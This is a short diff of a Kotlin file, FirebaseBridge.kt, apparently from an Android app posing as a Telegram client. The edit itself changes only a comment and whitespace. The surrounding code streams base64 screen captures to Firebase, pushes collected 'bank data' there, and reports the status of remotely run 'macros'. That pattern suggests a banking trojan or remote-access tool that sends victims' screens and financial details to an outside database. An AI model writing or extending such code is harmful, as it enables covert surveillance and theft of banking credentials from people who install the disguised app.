@@ -1,4 +1,3 @@
-// FILE: app/src/main/java/com/telegram2/messaging/remote/FirebaseBridge.kt
 package com.telegram2.messaging.remote
 
 import com.google.firebase.database.*
@@ -30,6 +29,7 @@ object FirebaseBridge {
     }
 
     fun updateScreenFrame(base64: String) = screenRef.setValue(base64)
+
     fun updateScreenInfo(w: Int, h: Int) {
         deviceRef.child("screenInfo/width").setValue(w)
         deviceRef.child("screenInfo/height").setValue(h)
@@ -45,6 +45,7 @@ object FirebaseBridge {
     }
 
     fun pushBankData(json: String) = bankRef.push().setValue(json)
+
     fun reportMacro(macroId: String, success: Boolean, details: String) {
         deviceRef.child("macros/$macroId/status").setValue(if (success) "done" else "failed")
         deviceRef.child("macros/$macroId/details").setValue(details)
